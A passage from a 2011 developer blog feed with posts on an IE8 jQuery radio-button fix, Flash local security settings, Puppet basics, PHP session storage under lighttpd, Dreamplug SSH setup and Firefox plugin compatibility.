  &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;payment_1500&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;1500&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data[Payment][value]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;payment_2000&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;radio&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;2000&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;payment_2000&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;2000&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data[Payment][value]&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;payment_5000&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;radio&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;5000&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;payment_5000&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;5000&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Select&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pretty simple, isn&amp;#39;t it ? I only have three &lt;code&gt;radio&lt;/code&gt;buttons, and I would like
to get the selected value when pressing the Select &lt;code&gt;button&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;What should work everywhere&lt;/h2&gt;

&lt;p&gt;The following code is pretty straightforward and I expected it to just work.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;selected1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#myForm input[name=&amp;quot;data\\[Payment\\]\\[value\\]&amp;quot;]:checked&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;selected1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that we have to double escape the &lt;code&gt;[&lt;/code&gt; and &lt;code&gt;]&lt;/code&gt; characters and wrap in
quotes the &lt;code&gt;name&lt;/code&gt;value. Nothing fancy, just classic string protection.Â This
code works perfectly on Firefox and Chrome, and I deployed it in production
for a few weeks.&lt;/p&gt;

&lt;p&gt;Then, I got report of users that would have love to use the form, but got an
error because no value was selected. I tested and tested it again without
finding the cause. Then it occurs to me that all those reports came from user
using IE8.&lt;/p&gt;

&lt;p&gt;So I rebooted my VM, launched IE8 and was able to reproduce the bug on my
first try.&lt;/p&gt;

&lt;h2&gt;What the heck is IE8 doing ?&lt;/h2&gt;

&lt;p&gt;Well, that&amp;#39;s a deep question, and I&amp;#39;ve ask this myself countless times before.
Once more, IE is doing things in its own weird way.&lt;/p&gt;

&lt;p&gt;After some fiddling, I managed to make it work, by just slightly altering the
syntax.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;selected2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#myForm input[name=&amp;quot;data\\[Payment\\]\\[value\\]&amp;quot;]&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;:checked&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;selected2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yep, that&amp;#39;s right, I simply moved the &lt;code&gt;:checked&lt;/code&gt; selector in its own &lt;code&gt;filter
&lt;/code&gt;call and it worked. Took me a while to figure, but this finally turned out to
be an easy fix.&lt;/p&gt;

&lt;p&gt;You can test it yourself with &lt;a href=&quot;http://jsfiddle.net/pixelastic/WS53Q/1/&quot;&gt;this jsFiddle
example&lt;/a&gt;. Don&amp;#39;t forget to enable the
log panel in IE8 by pressing F12 before running the code.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Enabling Flash calls to distant server when working locally</title>
   <link href="http://blog.pixelastic.com/2011/08/30/enabling-flash-calls-distant-server-working-locally/"/>
   <updated>2011-08-30T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/30/enabling-flash-calls-distant-server-working-locally</id>
   <content type="html">&lt;p&gt;Default Flash security config prevents you from loading content from an
external website when running a Flash file locally.&lt;/p&gt;

&lt;p&gt;To prevent this, you have to go to &lt;a href=&quot;http://www.macromedia.com/suppo%0Art/documentation/en/flashplayer/help/settings_manager04.html&quot;&gt;this link&lt;/a&gt; and add the
directory where your file is located.&lt;/p&gt;

&lt;p&gt;Fortunatly, you can specify a top level directory and all subdirectories will
inherit the authorization.&lt;/p&gt;

&lt;p&gt;If you don&amp;#39;t do this step, your Flash file will refuse to download external
content.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>First steps with puppet</title>
   <link href="http://blog.pixelastic.com/2011/08/26/steps-puppet/"/>
   <updated>2011-08-26T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/26/steps-puppet</id>
   <content type="html">&lt;p&gt;I&amp;#39;ve never used puppet before this project. It in installed on our main
server, monitoring the whole pool of servers used to host our game. It
includes php hosts, sql data nodes and sql front servers as well as a couple
of load balancer.&lt;/p&gt;

&lt;p&gt;Puppet keeps a snapshot of the config that must be deployed on each server and
keep them in sync. We just have to edit the puppet files, and the same config
is replicated on each server.&lt;/p&gt;

&lt;p&gt;I did not install puppet, our sysadmin did it, and I have no idea how he did
it actually, I&amp;#39;m just fiddling with specific configurations here. But as it
took me quite a bit to grasp, here is how it works, and some quirks to be
aware of.&lt;/p&gt;

&lt;h2&gt;The puppet files&lt;/h2&gt;

&lt;p&gt;Puppet is installed in &lt;code&gt;/etc/puppet&lt;/code&gt;. Our different modules are stored in&lt;code&gt;
/etc/puppet/modules&lt;/code&gt;. A module is a set of programs and config files that work
together.&lt;/p&gt;

&lt;p&gt;For example, we have one for the &lt;code&gt;loadbalancers&lt;/code&gt;, one for the &lt;code&gt;http&lt;/code&gt;part, one
for &lt;code&gt;mysql&lt;/code&gt;, and even one for &lt;code&gt;vim&lt;/code&gt;. I&amp;#39;m going to focus on the &lt;code&gt;http&lt;/code&gt;one,
because it contains config files for memcache, lighttpd and php.&lt;/p&gt;

&lt;p&gt;Modules are split in two parts : the manifest and the files. You can find each
in &lt;code&gt;/etc/puppet/modules/{modulename}/manifests&lt;/code&gt; and in
&lt;code&gt;/etc/puppet/modules/{modulename}/files&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As you can imagine, the manifest contains a list of directive telling puppet
what programs need to be installed, what directories need to be present (with
specific user and group) as well as what files need to be copied.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;files/&lt;/code&gt; directory contains all the files that puppet might need for this
module. It will copy them from this directory to the final servers, according
to the manifest config.&lt;/p&gt;

&lt;h2&gt;Manifest syntax&lt;/h2&gt;

&lt;p&gt;The manifest uses a very simple syntax, using blocks of &lt;code&gt;key =&amp;gt; value&lt;/code&gt; to
define config. I&amp;#39;ve mostly use the simple &lt;code&gt;file&lt;/code&gt;directives, to copy files and
create directories.&lt;/p&gt;

&lt;p&gt;One can also use &lt;code&gt;package&lt;/code&gt;directories, to install things and handle
dependencies, but I haven&amp;#39;t messed with that (yet) so I won&amp;#39;t talk about them
here.&lt;/p&gt;

&lt;p&gt;Here are a couple of simple file orders :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-puppet&quot; data-lang=&quot;puppet&quot;&gt;&lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/etc/lighttpd/scripts&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;ensure&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;550&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/etc/lighttpd/lighttpd.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;644&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;puppet:///http/$target/lighttpd/lighttpd.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Package&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;lighttpd&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;notify&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Â &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Service&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;lighttpd&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first part will create a&lt;code&gt;/etc/lighttpd/scripts&lt;/code&gt; directory on the final
server, with a user and group &lt;code&gt;root&lt;/code&gt;and 550 permissions mode.&lt;/p&gt;

&lt;p&gt;The second part will copy the file stored in
&lt;code&gt;/etc/puppet/modules/http/{target}/lighttpd/lighttpd.conf&lt;/code&gt; on the puppet
server to &lt;code&gt;/etc/lighttpd/lighttpd.conf&lt;/code&gt; on the final server. I&amp;#39;m not quite
sure what the &lt;code&gt;require&lt;/code&gt;and &lt;code&gt;notify&lt;/code&gt;lines are for.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$target&lt;/code&gt; is a special variable. In my case it can take either the value
&lt;code&gt;valid&lt;/code&gt; orÂ &lt;code&gt;prod&lt;/code&gt;, allowing me to define custom config based on the
environment. Valid and prod environment are supposed to have the exact same
config, but separating them allow for testing a config change in one
environment without potentially breaking the working prod environment. I&amp;#39;m not
exactly sure how this &lt;code&gt;$target&lt;/code&gt; var is set, this is one more thing our
sysadmin did. Thanks to him.&lt;/p&gt;

&lt;h2&gt;Pulling changes&lt;/h2&gt;

&lt;p&gt;Puppet is configured to check its servers every 30mn. If some config files
changed, or a directory isn&amp;#39;t there anymore, it will recreate them, according
to the manifest. But you can force the pulling of changes from the final
servers themselves. Just log to one of the servers puppet is monitoring and
type&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo puppetd --test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;--test&lt;/code&gt; argument is a bit misleading. It actually does not seem to do any
test at all, it simply pulls the puppet files from the puppet server and
updates its files accordingly. It will notify you of any errors it might find,
and even print a &lt;code&gt;diff&lt;/code&gt;of the files changed.&lt;/p&gt;

&lt;h2&gt;One last thing&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ve lost 30mn checking and re-checking my puppet file because my &lt;code&gt;php.ini&lt;/code&gt;
changes weren&amp;#39;t updated. In fact, I just forgot to reload &lt;code&gt;lighttpd&lt;/code&gt;...&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP session on disk with lighttpd, and write access</title>
   <link href="http://blog.pixelastic.com/2011/08/26/php-session-disk-lighttpd-write-access/"/>
   <updated>2011-08-26T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/26/php-session-disk-lighttpd-write-access</id>
   <content type="html">&lt;p&gt;On HappyLife, we used to use Memcache to handle the php sessions. We
discovered a while back after much trouble that Memcache might not have been
the best solution for sessions on a high traffic site. But this will be the
subject of another post.&lt;/p&gt;

&lt;p&gt;Anyway, I switched back to classical session, stored on disk.&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s the relevant &lt;code&gt;php.ini&lt;/code&gt; config&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;k&quot;&gt;[Session]&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;session.save_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;files&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;session.save_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;/tmp/php&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;/tmp/php&lt;/code&gt; should be writable by &lt;code&gt;www-data&lt;/code&gt;, so&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chown www-data:www-data /tmp/php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #11 : First steps with my Dreamplug</title>
   <link href="http://blog.pixelastic.com/2011/08/24/working-wednesday-11-steps-dreamplug/"/>
   <updated>2011-08-24T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/24/working-wednesday-11-steps-dreamplug</id>
   <content type="html">&lt;p&gt;A while back, I ordered a Dreamplug. It&amp;#39;s a micro computer more or less the
size of a hard drive. It uses very little electricity, has ethernet, usb, sata
and sd ports as well as bluetooth and wifi connectivity.&lt;/p&gt;

&lt;p&gt;I wanted one to primarily work as a git and mercurial server to host my repos,
as well as host a few websites I might be working on. As it&amp;#39;s not the more
powerful of device and will be using my home ADSL connection, it&amp;#39;s also a good
fit for testing web performance optimisations.&lt;/p&gt;

&lt;p&gt;Actually, I have a lot of ideas for this plug (ssh tunnel, dropox-like server,
etc).&lt;/p&gt;

&lt;h2&gt;First, let&amp;#39;s establish a connection&lt;/h2&gt;

&lt;p&gt;To do any of that, you first have to log into your device. This first step
might have been the one that caused me the much trouble.&lt;/p&gt;

&lt;p&gt;I simply wanted to connect to the plug through SSH. I didn&amp;#39;t want to plug it
to my router because it would then have emit an open wifi network. Instead, I
wanted to access it through a simple ethernet cable.&lt;/p&gt;

&lt;p&gt;To do that I had to plug the Ethernet cable on the second slot (the one the
closer to the lights) on the plug, then turn it on. I didn&amp;#39;t manage to connect
with the cable in the other plug nor if I plugged it after turning the device
on.&lt;/p&gt;

&lt;p&gt;What took me a while to figure is that the Dreamplug have its own ip address :
&lt;code&gt;10.0.0.1&lt;/code&gt;. To enable transfer between your host and the plug, you have to set
a fixed ip address to your ethernet (mine was &lt;code&gt;eth0&lt;/code&gt;)&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo ifconfig eth0 10.0.0.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I chose &lt;code&gt;10.0.0.2&lt;/code&gt; because it&amp;#39;s close to the Dreamplug address and I will
remember it better, but you can actually choose anything you want, it
absolutely does not matter.&lt;/p&gt;

&lt;h2&gt;Connect through ssh&lt;/h2&gt;

&lt;p&gt;Once the first step is done, you are now able to connect to the device through
SSH.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh root@10.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The default password is &lt;code&gt;nosoup4u&lt;/code&gt;. I chose to keep it for now, as I&amp;#39;ll have
to type it a lot, but I&amp;#39;ll change it once everything is installed.&lt;/p&gt;

&lt;p&gt;First thing you should do is create a new user. Using &lt;code&gt;root&lt;/code&gt; for the day to
day activities is a bad habit.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;adduser pixelastic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You&amp;#39;ll be prompted for password and other misc informations. Once done, we
will give sudo power to this user.&lt;/p&gt;

&lt;p&gt;On others Ubuntu machines, I usually do a &lt;code&gt;adduser pixelastic admin&lt;/code&gt; or
&lt;code&gt;adduser pixelastic sudo&lt;/code&gt;, but this didn&amp;#39;t work here. There wasn&amp;#39;t even an
&lt;code&gt;admin&lt;/code&gt; group, and adding to &lt;code&gt;sudo&lt;/code&gt; didn&amp;#39;t seem to change anything.&lt;/p&gt;

&lt;p&gt;Instead, I had to edit the &lt;code&gt;/etc/sudoers&lt;/code&gt; file, using &lt;code&gt;visudo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;If you&amp;#39;ve never used &lt;code&gt;vi&lt;/code&gt; before, press &lt;code&gt;i&lt;/code&gt; to enter edit mode, and &lt;code&gt;vi&lt;/code&gt; will
acts as a common editor. Press &lt;code&gt;Esc&lt;/code&gt; when you&amp;#39;ve finished, then &lt;code&gt;:x&lt;/code&gt; to save
and exit&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I added a new line just below the one starting with &lt;code&gt;root&lt;/code&gt; and copied it,
simply by changing the user name.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;root    &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
pixelastic &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Your new user should now have the sudo powers.&lt;/p&gt;

&lt;p&gt;Unfortunatly, on my build one more thing was missing. It might not be the case
on your plug, but we&amp;#39;d better check.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which sudo
 /usr/bin/sudo
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ls -l /usr/bin/sudo
 -rwxr-xr-x 1 root root 114976 2011-02-14 08:08 /usr/bin/sudo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Check the permissions, if you have this output, then something is wrong. The
&lt;code&gt;sudo&lt;/code&gt; executable should have the &lt;code&gt;s&lt;/code&gt; permissions, otherwise it won&amp;#39;t work.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod u+s /usr/bin/sudo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, we can logout from the &lt;code&gt;root&lt;/code&gt; session, and login back with our new user&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh pixelastic@10.0.0.1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo &lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
 /home/pixelastic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;What next ?&lt;/h2&gt;

&lt;p&gt;Now, one last sensible thing to do is to change the root password for
something stronger, and even disable login as &lt;code&gt;root&lt;/code&gt; through ssh. To do that,
simply edit the &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; file and set &lt;code&gt;PermitRootLogin&lt;/code&gt; to &lt;code&gt;no&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;You could also add your keys to the plug to avoid typing your password,
install your softs, and link the plug to your router to make it accessible
from the outside.&lt;/p&gt;

&lt;p&gt;I plan to replace Ubuntu for Debian on my Dreamplug, I&amp;#39;ll post about that
later.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Keeping your plugins with any new Firefox version</title>
   <link href="http://blog.pixelastic.com/2011/08/19/keeping-plugins-firefox-version/"/>
   <updated>2011-08-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/08/19/keeping-plugins-firefox-version</id>
   <content type="html">&lt;p&gt;The new Firefox cycle version is such that you might lose all your beloved
plugins on each new release.&lt;/p&gt;

&lt;p&gt;Fortunatly, most of the plugins still work even when the version updates, so
you can still use them.&lt;/p&gt;

&lt;p&gt;The easiest way to automatically enable them all is to update a boolean value
in &lt;code&gt;about:config&lt;/code&gt; that will tell Firefox to not disable older plugins.&lt;/p&gt;

&lt;p&gt;The key changes for each version, but is called
&lt;code&gt;extensions.checkCompatibility.X.Y&lt;/code&gt; where &lt;code&gt;X&lt;/code&gt; and &lt;code&gt;Y&lt;/code&gt; are the version number
(like &lt;code&gt;X&lt;/code&gt;=7 and &lt;code&gt;Y&lt;/code&gt;=0 for the 7.0 release).&lt;/p&gt;

&lt;p&gt;Create the key (as a boolean value), and set it to &lt;code&gt;false&lt;/code&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
